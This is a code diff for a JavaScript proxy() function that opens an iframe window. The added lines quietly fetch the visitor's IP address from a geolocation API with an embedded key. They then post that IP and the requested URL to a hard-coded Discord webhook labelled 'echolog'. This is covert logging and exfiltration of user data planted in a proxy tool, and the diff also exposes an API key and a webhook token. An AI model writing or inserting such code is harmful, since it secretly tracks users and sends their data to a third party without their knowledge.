@@ -16,4 +16,19 @@ function proxy() {
     win.document.body.appendChild(iframe);
 
     window.open(win);
+
+    $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=0d32a7e922c5498f9510474f249d7810", function (data) {
+        const ip = data.ip_address;
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1070791291090247770/GSzmpVbjZd3LqBIVoLDVKy-zLjGwixou09cMU0Wm6O31S-L02WEV6WIX_R7LUjJ7D0yN");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "echolog",
+          avatar_url: "https://xpstools.github.io/echolog.jpg",
+          content: "**Proxy request opened!**\n> IP: " + ip + 
+          "\n> URL: " + name
+        };
+        request.send(JSON.stringify(params));
+    });
 }
